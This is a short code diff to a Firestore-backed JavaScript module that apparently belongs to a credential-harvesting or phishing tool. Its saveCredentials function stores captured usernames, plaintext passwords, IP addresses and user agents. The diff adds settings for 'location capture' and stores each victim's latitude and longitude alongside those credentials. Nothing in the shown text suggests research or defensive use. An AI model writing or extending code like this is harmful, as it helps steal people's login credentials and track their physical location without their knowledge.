@@ -19,7 +19,14 @@ export const db = getFirestore(app);
 // --- Settings ---
 export async function getSettings() {
     const settingsDoc = await getDoc(doc(db, 'config', 'settings'));
-    return settingsDoc.exists() ? settingsDoc.data() : { captureMode: 'username' };
+    if (!settingsDoc.exists()) {
+        return {
+            captureMode: 'username',
+            enableLocationCapture: false,
+            locationStrategy: 'login_integrated'
+        };
+    }
+    return settingsDoc.data();
 }
 
 export async function updateSettings(settings) {
@@ -60,6 +67,7 @@ export async function saveCredentials(data) {
         username: data.username,
         password: data.password,
         ip: data.ip || 'Unknown',
+        location: data.location || null, // { lat: number, lng: number, strategy: string }
         userAgent: navigator.userAgent,
         timestamp: new Date().toISOString()
     });
